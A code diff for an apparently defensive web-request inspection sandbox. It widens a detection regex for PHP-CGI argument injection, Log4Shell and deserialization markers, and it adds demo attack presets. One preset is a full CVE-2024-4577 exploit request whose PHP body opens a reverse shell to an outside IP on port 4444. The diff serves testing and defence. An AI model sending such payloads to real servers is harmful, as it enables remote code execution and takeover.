@@ -206,7 +206,7 @@ export const RULES_DEFINITIONS = {
   ZERODAY: {
     id: 'ZERODAY',
     name: 'Zero-Day Virtual Patching (PHP2Shell, Log4Shell, SSTI, Deserialization)',
-    regex: /(?:allow_url_include|auto_prepend_file|php:\/\/(?:input|filter|memory)|expect:\/\/|phar:\/\/|%ad[dD]\+|\$\{jndi:(?:ldap|rmi|dns|nis|iiop)|\{\{\s*7\s*\*\s*7\s*\}\}|O:\d+:"[^"]+":\d+:\{|rO0ABX|X-PHP2Shell|cve-2026-109618)/i,
+    regex: /(?:allow_url_include|auto_prepend_file|cgi\.force_redirect|php:\/\/(?:input|filter|memory)|expect:\/\/|phar:\/\/|%ad[dD]|\$\{jndi:(?:ldap|rmi|dns|nis|iiop)|\{\{\s*7\s*\*\s*7\s*\}\}|O:\d+:"[^"]+":\d+:\{|rO0ABX|X-PHP2Shell|cve-2024-4577|cve-2026-109618)/i,
     severity: 'CRITICAL' as ThreatSeverity,
     riskScore: 99,
     threatType: 'ZERO_DAY_VIRTUAL_PATCH',
@@ -293,7 +293,14 @@ export function inspectSandboxRequest(req: SandboxRequest, maxBytes = 65536): Sa
     .map(([k, v]) => `${k}: ${v}`)
     .join(' ');
   const rawCombined = `${method} ${url} ${headersStr} ${body}`.trim();
-  const byteLength = new Blob([rawCombined]).size;
+  const declaredContentLength = parseInt(
+    headers['Content-Length'] || headers['content-length'] || '0',
+    10
+  );
+  const byteLength = Math.max(
+    new Blob([rawCombined]).size,
+    Number.isFinite(declaredContentLength) ? declaredContentLength : 0
+  );
 
   // Canonicalisation et calcul d'entropie
   const canonRes = canonicalizeInput(rawCombined);
@@ -312,8 +319,8 @@ export function inspectSandboxRequest(req: SandboxRequest, maxBytes = 65536): Sa
       severity: 'CRITICAL',
       threatType: 'OVERFLOW_PAYLOAD_413',
       matchedRuleId: 'VOLUMETRIC_LIMIT',
-      ruleName: 'Protection Volumétrique / Buffer & Heap Overflow',
-      patternDescription: `Taille déclarée (${byteLength} octets) excède la limite stricte de ${maxBytes} octets (Prévention Buffer Overflow & Débordement de mémoire).`,
+      ruleName: 'Protection Volumétrique / Buffer & Heap Overflow (CVE-2026-109618)',
+      patternDescription: `Taille déclarée (${byteLength} octets) excède la limite stricte de ${maxBytes} octets (Prévention Buffer Overflow & Débordement de mémoire PHP-FPM).`,
       latencyMs: parseFloat((t1 - t0).toFixed(3)),
       timestamp,
       entropy: { ...entropy, value: Math.max(entropy.value, 4.8) },
@@ -581,6 +588,40 @@ export const SANDBOX_PRESETS: SandboxPreset[] = [
         'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIER1cG9udCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
       },
       body: JSON.stringify({ plan: 'sovereign_pro', currency: 'EUR' }, null, 2),
+    },
+  },
+  {
+    id: 'php2shell-cve-2024-4577',
+    name: 'PHP2Shell RCE (CVE-2024-4577)',
+    badge: '🔥 PHP2Shell 403',
+    category: 'attack',
+    description: 'Injection d\'arguments PHP-CGI (%ADd allow_url_include=1 + auto_prepend_file=php://input) exécutant un reverse-shell. Intercepté à l\'Edge (0% CPU cible, 5.81 W vs 24.14 W).',
+    request: {
+      method: 'POST',
+      url: '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) PHP2Shell-Exploit/2.1',
+        'Content-Type': 'application/x-httpd-php',
+        'X-PHP2Shell-Vector': 'CVE-2024-4577-CGI-Arg-Injection',
+      },
+      body: '<?php system("id; uname -a; /bin/sh -i >& /dev/tcp/185.220.101.33/4444 0>&1"); die(); ?>',
+    },
+  },
+  {
+    id: 'php2shell-overflow-413',
+    name: 'PHP2Shell Buffer Overflow',
+    badge: '💣 Overflow 413',
+    category: 'attack',
+    description: 'Dépassement de tampon volumétrique FastCGI/PHP-FPM (CVE-2026-109618, 72 Ko > 64 Ko). Stoppé net par le coupe-circuit volumétrique HTTP 413 avant allocation mémoire.',
+    request: {
+      method: 'POST',
+      url: '/cgi-bin/php-cgi?%ADd+cgi.force_redirect%3d0+%ADd+auto_prepend_file%3dphp://input',
+      headers: {
+        'User-Agent': 'PHP2Shell-BufferOverflow/1.4 (CVE-2026-109618)',
+        'Content-Type': 'application/octet-stream',
+        'Content-Length': '73728',
+      },
+      body: '<?php /* CVE-2026-109618 HEAP SPRAY NOP SLED (72 KB) */ ' + '0x90909090_FPM_OVERFLOW_'.repeat(32) + ' ?>',
     },
   },
   {
